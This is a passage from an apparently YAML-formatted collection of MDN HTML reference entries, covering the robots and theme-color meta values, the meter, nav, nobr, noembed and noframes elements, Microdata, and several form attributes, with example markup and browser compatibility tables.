[Bing](https://www.bing.com/webmasters/help/which-robots-metatags-does-bing-support-5198d240)                                                                                                                                                            |\n\n  **Note:**\n\n  - Only cooperative robots follow these rules. Do not expect to prevent email harvesters with them.\n  - The robot still needs to access the page in order to read these rules. To prevent bandwidth consumption, consider if using a *[robots.txt](https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt)* file is more appropriate.\n  - The `robots` `<meta>` tag and `robots.txt` file serve different purposes: `robots.txt` controls the crawling of pages, and does not affect indexing or other behavior controlled by `robots` meta. A page that can't be crawled may still be indexed if it is referenced by another document.\n  - If you want to remove a page, `noindex` will work, but only after the robot visits the page again. Ensure that the `robots.txt` file is not preventing revisits.\n  - Some values are mutually exclusive, like `index` and `noindex`, or `follow` and `nofollow`. In these cases the robot's behavior is undefined and may vary between them.\n  - Some crawler robots, like Google, Yahoo and Bing, support the same values for the HTTP header `X-Robots-Tag`; this allows non-HTML documents like images to use these rules.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Viewport `<meta>` tag](../../viewport_meta_tag)\n- [Metadata: the `<meta>` element](https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/The_head_metadata_in_HTML#metadata_the_meta_element) in [What's in the head? Metadata in HTML](https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/The_head_metadata_in_HTML)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta/name](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta/name)"
- name: meta.name.theme-color
  summary: The theme-color value for the name attribute of the <meta> element indicates a suggested color that user agents should use to customize the display of the page or of the surrounding user interface
  description: "# theme-color\n\nThe `theme-color` value for the [`name`](../../meta#name) attribute of the [`<meta>`](../../meta) element indicates a suggested color that user agents should use to customize the display of the page or of the surrounding user interface. If specified, the [`content`](../../meta#content) attribute must contain a valid CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value).\n\n## Example\n\nhtml\n\n```\n<meta name=\"theme-color\" content=\"#4285f4\" />\n```\n\nThe following image shows the effect that the [`<meta>`](../../meta) element above will have on a document displayed in Chrome running on an Android mobile device.\n\n*Image credit: from [Icons & Browser Colors](https://web.dev/articles/icons-and-browser-colors), created and shared by Google and used according to terms described in the [Creative Commons 4.0 Attribution License](https://creativecommons.org/licenses/by/4.0/).*\n\nYou can provide a media type or query inside the [`media`](../../meta#media) attribute; the color will then only be set if the media condition is true. For example:\n\nhtml\n\n```\n<meta name=\"theme-color\" media=\"(prefers-color-scheme: light)\" content=\"cyan\" />\n<meta name=\"theme-color\" media=\"(prefers-color-scheme: dark)\" content=\"black\" />\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`color-scheme`](https://developer.mozilla.org/en-US/docs/Web/CSS/color-scheme) CSS property\n- [`prefers-color-scheme`](https://developer.mozilla.org/en-US/docs/Web/CSS/@media/prefers-color-scheme) media query\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta/name/theme-color](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta/name/theme-color)"
- name: meter
  summary: The <meter> HTML element represents either a scalar value within a known range or a fractional value
  description: "# \\<meter\\>: The HTML Meter element\n\nThe `<meter>` [HTML](../index) element represents either a scalar value within a known range or a fractional value.\n\n## Try it\n\n#### HTML Demo: \\<meter\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"fuel\">Fuel level:</label>\n\n    <meter id=\"fuel\" min=\"0\" max=\"100\" low=\"33\" high=\"66\" optimum=\"80\" value=\"50\">at 50/100</meter>\n\n    label {\n      padding-right: 10px;\n      font-size: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`value`](#value)  \nThe current numeric value. This must be between the minimum and maximum values (`min` attribute and `max` attribute) if they are specified. If unspecified or malformed, the value is `0`. If specified, but not within the range given by the `min` attribute and `max` attribute, the value is equal to the nearest end of the range.\n\n**Note:** Unless the `value` attribute is between `0` and `1` (inclusive), the `min` and `max` attributes should define the range so that the `value` attribute's value is within it.\n\n[`min`](../attributes/min)  \nThe lower numeric bound of the measured range. This must be less than the maximum value (`max` attribute), if specified. If unspecified, the minimum value is `0`.\n\n[`max`](../attributes/max)  \nThe upper numeric bound of the measured range. This must be greater than the minimum value (`min` attribute), if specified. If unspecified, the maximum value is `1`.\n\n[`low`](#low)  \nThe upper numeric bound of the low end of the measured range. This must be greater than the minimum value (`min` attribute), and it also must be less than the high value and maximum value (`high` attribute and `max` attribute, respectively), if any are specified. If unspecified, or if less than the minimum value, the `low` value is equal to the minimum value.\n\n[`high`](#high)  \nThe lower numeric bound of the high end of the measured range. This must be less than the maximum value (`max` attribute), and it also must be greater than the low value and minimum value (`low` attribute and `min` attribute, respectively), if any are specified. If unspecified, or if greater than the maximum value, the `high` value is equal to the maximum value.\n\n[`optimum`](#optimum)  \nThis attribute indicates the optimal numeric value. It must be within the range (as defined by the `min` attribute and `max` attribute). When used with the `low` attribute and `high` attribute, it gives an indication where along the range is considered preferable. For example, if it is between the `min` attribute and the `low` attribute, then the lower range is considered preferred. The browser may color the meter's bar differently depending on whether the value is less than or equal to the optimum value.\n\n[`form`](#form)  \nThis optional attribute is used to explicitly set a [`<form>`](form) owner for the `<meter>` element. If omitted, the `<meter>` is associated with its ancestor `<form>` element or the form association set by the `form` attribute on another ancestor element, such as on a [`<fieldset>`](fieldset), if any. If included, the value must be the [`id`](../global_attributes/id) of a `<form>` in the same tree.\n\n## Examples\n\n### Simple Example\n\n#### HTML\n\nhtml\n\n```\n<p>Battery level: <meter min=\"0\" max=\"100\" value=\"75\">75%</meter></p>\n```\n\n#### Result\n\n### High and low range example\n\nNote that in this example the [`min`](#min) attribute is omitted. This is allowed, as it will default to `0`.\n\n#### HTML\n\nhtml\n\n```\n<p>\n  Student's exam score:\n  <meter min=\"0\" low=\"50\" high=\"80\" max=\"100\" value=\"84\">84%</meter>\n</p>\n```\n\n#### Result\n\n## Technical Summary\n\n|                                             |                                                                                                                                                      |\n|---------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), labelable content, palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content), but there must be no `<meter>` element among its descendants.                            |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                 |\n| Implicit ARIA role                          | [`meter`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents)             |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                  |\n| DOM interface                               | [`HTMLMeterElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMeterElement)                                                              |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `meter`   | 6       | ≤18  | 16      | 11    | 6      | 18             | 16                  | 11            | 10.3          | 1.0              | No              |     |\n| `high`    | 6       | ≤18  | 16      | 11    | 6      | 18             | 16                  | 11            | 10.3          | 1.0              | No              |     |\n| `low`     | 6       | ≤18  | 16      | 11    | 6      | 18             | 16                  | 11            | 10.3          | 1.0              | No              |     |\n| `max`     | 6       | ≤18  | 16      | 11    | 6      | 18             | 16                  | 11            | 10.3          | 1.0              | No              |     |\n| `min`     | 6       | ≤18  | 16      | 11    | 6      | 18             | 16                  | 11            | 10.3          | 1.0              | No              |     |\n| `optimum` | 6       | ≤18  | 16      | 11    | 6      | 18             | 16                  | 11            | 10.3          | 1.0              | No              |     |\n| `value`   | 6       | ≤18  | 16      | 11    | 6      | 18             | 16                  | 11            | 10.3          | 1.0              | No              |     |\n\n## See also\n\n- [Creating vertical form controls](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_writing_modes/Vertical_controls)\n- [`<progress>`](progress)\n- [`::-webkit-meter-bar`](https://developer.mozilla.org/en-US/docs/Web/CSS/::-webkit-meter-bar), [`::-webkit-meter-inner-element`](https://developer.mozilla.org/en-US/docs/Web/CSS/::-webkit-meter-inner-element), [`::-webkit-meter-even-less-good-value`](https://developer.mozilla.org/en-US/docs/Web/CSS/::-webkit-meter-even-less-good-value), [`::-webkit-meter-optimum-value`](https://developer.mozilla.org/en-US/docs/Web/CSS/::-webkit-meter-optimum-value), [`::-webkit-meter-suboptimum-value`](https://developer.mozilla.org/en-US/docs/Web/CSS/::-webkit-meter-suboptimum-value): non-standard pseudo-elements\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meter](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meter)"
- name: method (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`method`](element/form#method)

    [`<form>`](element/form)

    Defines which [HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP) method to use when submitting the form. Can be `GET` (default) or `POST`.
- name: Microdata
  summary: Microdata is part of the WHATWG HTML Standard and is used to nest metadata within existing content on web pages
  description: "# Microdata\n\nMicrodata is part of the [WHATWG](https://developer.mozilla.org/en-US/docs/Glossary/WHATWG) HTML Standard and is used to nest metadata within existing content on web pages. Search engines and web crawlers can extract and process microdata from a web page and use it to provide a richer browsing experience for users. Search engines benefit greatly from direct access to this structured data because it allows search engines to understand the information on web pages and provide more relevant results to users. Microdata uses a supporting vocabulary to describe an item and name-value pairs to assign values to its properties. Microdata is an attempt to provide a simpler way of annotating HTML elements with machine-readable tags than the similar approaches of using RDFa and classic microformats.\n\nAt a high level, microdata consists of a group of name-value pairs. The groups are called items, and each name-value pair is a property. Items and properties are represented by regular elements.\n\n- To create an item, the `itemscope` attribute is used.\n- To add a property to an item, the `itemprop` attribute is used on one of the item's descendants.\n\n## Vocabularies\n\nGoogle and other major search engines support the [Schema.org](https://schema.org/) vocabulary for structured data. This vocabulary defines a standard set of type names and property names, for example, [Schema.org Music Event](https://schema.org/MusicEvent) indicates a concert performance, with [`startDate`](https://schema.org/startDate) and [`location`](https://schema.org/location) properties to specify the concert's key details. In this case, [Schema.org Music Event](https://schema.org/MusicEvent) would be the URL used by `itemtype` and `startDate` and location would be `itemprop`'s that [Schema.org Music Event](https://schema.org/MusicEvent) defines.\n\n**Note:** More about itemtype attributes can be found at [https://schema.org/Thing](https://schema.org/Thing).\n\nMicrodata vocabularies provide the semantics or meaning of an *`Item`*. Web developers can design a custom vocabulary or use vocabularies available on the web, such as the widely used [schema.org](https://schema.org/) vocabulary. A collection of commonly used markup vocabularies are provided by Schema.org.\n\nCommonly used vocabularies:\n\n- Creative works: [CreativeWork](https://schema.org/CreativeWork), [Book](https://schema.org/Book), [Movie](https://schema.org/Movie), [MusicRecording](https://schema.org/MusicRecording), [Recipe](https://schema.org/Recipe), [TVSeries](https://schema.org/TVSeries)\n- Embedded non-text objects: [AudioObject](https://schema.org/AudioObject), [ImageObject](https://schema.org/ImageObject), [VideoObject](https://schema.org/VideoObject)\n- [`Event`](https://schema.org/Event)\n- [Health and medical types](https://schema.org/docs/meddocs.html): Notes on the health and medical types under [MedicalEntity](https://schema.org/MedicalEntity)\n- [`Organization`](https://schema.org/Organization)\n- [`Person`](https://schema.org/Person)\n- [`Place`](https://schema.org/Place), [LocalBusiness](https://schema.org/LocalBusiness), [Restaurant](https://schema.org/Restaurant)\n- [`Product`](https://schema.org/Product), [Offer](https://schema.org/Offer), [AggregateOffer](https://schema.org/AggregateOffer)\n- [`Review`](https://schema.org/Review), [AggregateRating](https://schema.org/AggregateRating)\n- [`Action`](https://schema.org/Action)\n- [`Thing`](https://schema.org/Thing)\n- [`Intangible`](https://schema.org/Intangible)\n\nMajor search engine operators like Google, Microsoft, and Yahoo! rely on the [schema.org](https://schema.org/) vocabulary to improve search results. For some purposes, an ad hoc vocabulary is adequate. For others, a vocabulary will need to be designed. Where possible, authors are encouraged to re-use existing vocabularies, as this makes content re-use easier.\n\n## Localization\n\nIn some cases, search engines covering specific regions may provide locally-specific extensions of microdata. For example, [Yandex](https://yandex.com/), a major search engine in Russia, supports microformats such as `hCard` (company contact information), `hRecipe` (food recipe), `hReview` (market reviews) and `hProduct` (product data) and provides its own format for the definition of the terms and encyclopedic articles. This extension was made to solve transliteration problems between the Cyrillic and Latin alphabets. Due to the implementation of additional marking parameters of Schema's vocabulary, the indexation of information in Russian-language web-pages became considerably more successful.\n\n## Global attributes\n\n[`itemid`](global_attributes/itemid) – The unique, global identifier of an item.\n\n[`itemprop`](global_attributes/itemprop) – Used to add properties to an item. Every HTML element may have an `itemprop` attribute specified, where an `itemprop` consists of a name and value pair.\n\n[`itemref`](global_attributes/itemref) – Properties that are not descendants of an element with the `itemscope` attribute can be associated with the item using an **itemref**. `itemref` provides a list of element ids (not `itemid`s) with additional properties elsewhere in the document.\n\n[`itemscope`](global_attributes/itemscope) – The `itemscope` attribute (usually) works along with [`itemtype`](global_attributes/itemtype) to specify that the HTML contained in a block is about a particular item. The `itemscope` attribute creates the *`Item`* and defines the scope of the itemtype associated with it. The `itemtype` attribute is a valid URL of a vocabulary (such as [schema.org](https://schema.org/)) that describes the item and its properties context.\n\n[`itemtype`](global_attributes/itemtype) – Specifies the URL of the vocabulary that will be used to define `itemprop`'s (item properties) in the data structure. The [`itemscope`](global_attributes/itemscope) attribute is used to set the scope of where in the data structure the vocabulary set by `itemtype` will be active.\n\n## Example\n\n### HTML\n\nhtml\n\n```\n<div itemscope itemtype=\"https://schema.org/SoftwareApplication\">\n  <span itemprop=\"name\">Angry Birds</span> - REQUIRES\n  <span itemprop=\"operatingSystem\">ANDROID</span><br />\n  <link\n    itemprop=\"applicationCategory\"\n    href=\"https://schema.org/SoftwareApplication\" />\n\n  <div\n    itemprop=\"aggregateRating\"\n    itemscope\n    itemtype=\"https://schema.org/AggregateRating\">\n    RATING:\n    <span itemprop=\"ratingValue\">4.6</span> (\n    <span itemprop=\"ratingCount\">8864</span> ratings )\n  </div>\n\n  <div itemprop=\"offers\" itemscope itemtype=\"https://schema.org/Offer\">\n    Price: $<span itemprop=\"price\">1.00</span>\n    <meta itemprop=\"priceCurrency\" content=\"USD\" />\n  </div>\n</div>\n```\n\n### Structured data\n\n|           |                      |                                                              |                                                              |\n|-----------|----------------------|--------------------------------------------------------------|--------------------------------------------------------------|\n| itemscope | itemtype             | SoftwareApplication (https://schema.org/SoftwareApplication) |                                                              |\n|           | itemprop             | name                                                         | Angry Birds                                                  |\n|           | itemprop             | operatingSystem                                              | ANDROID                                                      |\n|           | itemprop             | applicationCategory                                          | SoftwareApplication (https://schema.org/SoftwareApplication) |\n| itemscope | itemprop\\[itemtype\\] | aggregateRating \\[AggregateRating\\]                          |                                                              |\n|           | itemprop             | ratingValue                                                  | 4.6                                                          |\n|           | itemprop             | ratingCount                                                  | 8864                                                         |\n| itemscope | itemprop\\[itemtype\\] | offers \\[Offer\\]                                             |                                                              |\n|           | itemprop             | price                                                        | 1.00                                                         |\n|           | itemprop             | priceCurrency                                                | USD                                                          |\n\n### Result\n\n**Note:** A handy tool for extracting microdata structures from HTML is Google's [Structured Data Testing Tool](https://developers.google.com/search/docs/appearance/structured-data/intro-structured-data). Try it on the HTML shown above.\n\n## See also\n\n- [Global Attributes](global_attributes)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Microdata](https://developer.mozilla.org/en-US/docs/Web/HTML/Microdata)"
- name: min (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`min`](attributes/min)

    [`<input>`](element/input), [`<meter>`](element/meter)

    Indicates the minimum value allowed.
- name: minlength (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`minlength`](attributes/minlength)

    [`<input>`](element/input), [`<textarea>`](element/textarea)

    Defines the minimum number of characters allowed in the element.
- name: multiple (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`multiple`](attributes/multiple)

    [`<input>`](element/input), [`<select>`](element/select)

    Indicates whether multiple values can be entered in an input of the type `email` or `file`.
- name: muted (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`muted`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/muted)

    [`<audio>`](element/audio), [`<video>`](element/video)

    Indicates whether the audio will be initially silenced on page load.
- name: name (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`name`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/name)

    [`<button>`](element/button), [`<form>`](element/form), [`<fieldset>`](element/fieldset), [`<iframe>`](element/iframe), [`<input>`](element/input), [`<object>`](element/object), [`<output>`](element/output), [`<select>`](element/select), [`<textarea>`](element/textarea), [`<map>`](element/map), [`<meta>`](element/meta), [`<param>`](element/param)

    Name of the element. For example used by the server to identify the fields in form submits.
- name: nav
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<nav\\>: The Navigation Section element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fnav&level=high)\n\nThe `<nav>` [HTML](../index) element represents a section of a page whose purpose is to provide navigation links, either within the current document or to other documents. Common examples of navigation sections are menus, tables of contents, and indexes.\n\n## Try it\n\n#### HTML Demo: \\<nav\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <nav class=\"crumbs\">\n      <ol>\n        <li class=\"crumb\"><a href=\"#\">Bikes</a></li>\n        <li class=\"crumb\"><a href=\"#\">BMX</a></li>\n        <li class=\"crumb\">Jump Bike 3000</li>\n      </ol>\n    </nav>\n\n    <h1>Jump Bike 3000</h1>\n    <p>\n      This BMX bike is a solid step into the pro world. It looks as legit as it rides and is built to polish your skills.\n    </p>\n\n    nav {\n      border-bottom: 1px solid black;\n    }\n\n    .crumbs ol {\n      list-style-type: none;\n      padding-left: 0;\n    }\n\n    .crumb {\n      display: inline-block;\n    }\n\n    .crumb a::after {\n      display: inline-block;\n      color: #000;\n      content: '>';\n      font-size: 80%;\n      font-weight: bold;\n      padding: 0 3px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n- It's not necessary for all links to be contained in a `<nav>` element. `<nav>` is intended only for a major block of navigation links; typically the [`<footer>`](footer) element often has a list of links that don't need to be in a `<nav>` element.\n- A document may have several `<nav>` elements, for example, one for site navigation and one for intra-page navigation. [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) can be used in such case to promote accessibility, see [example](heading_elements#labeling_section_content).\n- User agents, such as screen readers targeting disabled users, can use this element to determine whether to omit the initial rendering of navigation-only content.\n\n## Examples\n\nIn this example, a `<nav>` block is used to contain an unordered list ([`<ul>`](ul)) of links. With appropriate CSS, this can be presented as a sidebar, navigation bar, or drop-down menu.\n\nhtml\n\n```\n<nav class=\"menu\">\n  <ul>\n    <li><a href=\"#\">Home</a></li>\n    <li><a href=\"#\">About</a></li>\n    <li><a href=\"#\">Contact</a></li>\n  </ul>\n</nav>\n```\n\nThe semantics of the `nav` element is that of providing links. However a `nav` element doesn't have to contain a list, it can contain other kinds of content as well. In this navigation block, links are provided in prose:\n\nhtml\n\n```\n<nav>\n  <h2>Navigation</h2>\n  <p>\n    You are on my home page. To the north lies <a href=\"/blog\">my blog</a>, from\n    whence the sounds of battle can be heard. To the east you can see a large\n    mountain, upon which many <a href=\"/school\">school papers</a> are littered.\n    Far up this mountain you can spy a little figure who appears to be me,\n    desperately scribbling a <a href=\"/school/thesis\">thesis</a>.\n  </p>\n  <p>\n    To the west are several exits. One fun-looking exit is labeled\n    <a href=\"https://games.example.com/\">\"games\"</a>. Another more\n    boring-looking exit is labeled <a href=\"https://isp.example.net/\">ISP™</a>.\n  </p>\n  <p>\n    To the south lies a dark and dank <a href=\"/about\">contacts page</a>.\n    Cobwebs cover its disused entrance, and at one point you see a rat run\n    quickly out of the page.\n  </p>\n</nav>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                       |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [sectioning content](../content_categories#sectioning_content), palpable content. |\n| Permitted content                           | [Flow content](../content_categories#flow_content).                                                                                   |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                 |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                                          |\n| Implicit ARIA role                          | [`navigation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/navigation_role)                                 |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                   |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `nav` | 5       | 12   | 4       | 11.1  | 5      | 18             | 4                   | 11.1          | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- Other section-related elements: [`<body>`](body), [`<article>`](article), [`<section>`](section), [`<aside>`](aside), [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), [h6](heading_elements), [`<hgroup>`](hgroup), [`<header>`](header), [`<footer>`](footer), [`<address>`](address);\n- [Sections and outlines of an HTML document](heading_elements).\n- [ARIA: Navigation role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/navigation_role)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/nav](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/nav)"
- name: nobr
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<nobr\\>: The Non-Breaking Text element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<nobr>` [HTML](../index) element prevents the text it contains from automatically wrapping across multiple lines, potentially resulting in the user having to scroll horizontally to see the entire width of the text.\n\n**Warning:** Although this element is widely supported, it was *never* standard HTML, so you shouldn't use it. Instead, use the CSS property [`white-space`](https://developer.mozilla.org/en-US/docs/Web/CSS/white-space) like this:\n\nhtml\n\n```\n<span style=\"white-space: nowrap;\">Long line with no breaks</span>\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `nobr` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [`white-space`](https://developer.mozilla.org/en-US/docs/Web/CSS/white-space)\n- [`overflow`](https://developer.mozilla.org/en-US/docs/Web/CSS/overflow)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/nobr](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/nobr)"
- name: noembed
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<noembed\\>: The Embed Fallback element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<noembed>` [HTML](../index) element is an obsolete, non-standard way to provide alternative, or \"fallback\", content for browsers that do not support the [`<embed>`](embed) element or do not support the type of [embedded content](../content_categories#embedded_content) an author wishes to use. This element was deprecated in HTML 4.01 and above in favor of placing fallback content between the opening and closing tags of an [`<object>`](object) element.\n\n**Note:** While this element currently still works in many browsers, it is obsolete and should not be used. Use [`<object>`](object) instead, with fallback content between the opening and closing tags of the element.\n\n## Examples\n\nThe message inside `<noembed>` tag will appear only when your browser does not support `<embed>` tag.\n\n### Show an alternative content\n\nhtml\n\n```\n<embed type=\"vide/webm\" src=\"/media/examples/flower.mp4\" width=\"200\" height=\"200\">\n  <noembed>\n    <h1>Alternative content</h1>\n  </noembed>\n</embed>\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `noembed` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/noembed](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/noembed)"
- name: noframes
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<noframes\\>: The Frame Fallback element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<noframes>` [HTML](../index) element provides content to be presented in browsers that don't support (or have disabled support for) the [`<frame>`](frame) element. Although most commonly-used browsers support frames, there are exceptions, including certain special-use browsers including some mobile browsers, as well as text-mode browsers.\n\nA `<noframes>` element can contain any HTML elements that are allowed within the body of an HTML document, except for the [`<frameset>`](frameset) and [`<frame>`](frame) elements, since using frames when they aren't supported doesn't make sense.\n\n`<noframes>` can be used to present a message explaining that the user's browser doesn't support frames, but ideally should be used to present an alternate form of the site that doesn't use frames but still offers the same or similar functionality.\n\n**Note:** This element is obsolete and shouldn't be used, since the [`<frame>`](frame) and [`<frameset>`](frameset) elements are also obsolete. When frames are needed at all, they should be presented using the [`<iframe>`](iframe) element.\n\n## Attributes\n\nLike all other HTML elements, this element supports the [global attributes](../global_attributes). It has no other attributes available.\n\n## Example\n\nIn this example, we see a frameset with two frames. In addition, `<noframes>` is used to present an explanatory message if the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) doesn't support frames.\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en-US\">\n  <head>\n    <!-- Document metadata goes here -->\n  </head>\n  <frameset rows=\"45%, 55%\">\n    <frame src=\"https://developer.mozilla.org/en/HTML/Element/frameset\" />\n    <frame src=\"https://developer.mozilla.org/en/HTML/Element/frame\" />\n    <noframes>\n      <p>\n        It seems your browser does not support frames or is configured to not\n        allow them.\n      </p>\n    </noframes>\n  </frameset>\n</html>\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `noframes` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<frameset>`](frameset)\n- [`<frame>`](frame)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/noframes](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/noframes)"
- name: nonce (attribute)
